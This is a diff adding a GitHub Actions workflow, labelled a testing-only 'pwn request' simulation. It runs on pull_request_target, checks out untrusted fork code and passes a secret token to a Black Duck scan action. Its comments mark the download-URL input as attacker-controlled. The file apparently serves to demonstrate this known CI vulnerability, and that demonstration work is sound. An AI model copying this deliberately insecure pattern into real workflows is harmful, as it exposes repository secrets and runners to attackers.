@@ -1,0 +1,22 @@
+name: Pwn Request Simulation (Testing Only - Do Not Use on Real Projects)
+on:
+  pull_request_target:  # DANGEROUS: Gives fork PRs access to secrets
+    branches:
+      - main
+
+jobs:
+  test-ssrf:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Fork PR Code (DANGEROUS)
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }} # Checks out untrusted code
+
+      - name: Call Black Duck Action with Attacker-Controlled Input
+        uses: blackduck-inc/black-duck-security-scan@v2.1.1
+        with:
+          blackducksca_url: ${{ vars.BLACKDUCKSCA_URL }}
+          blackducksca_token: ${{ secrets.BLACKDUCKSCA_TOKEN }}
+          # The "exploit": Attacker PR controls this input via a file they modified
+          bridgecli_download_url: ${{ some_attacker_controlled_value }}
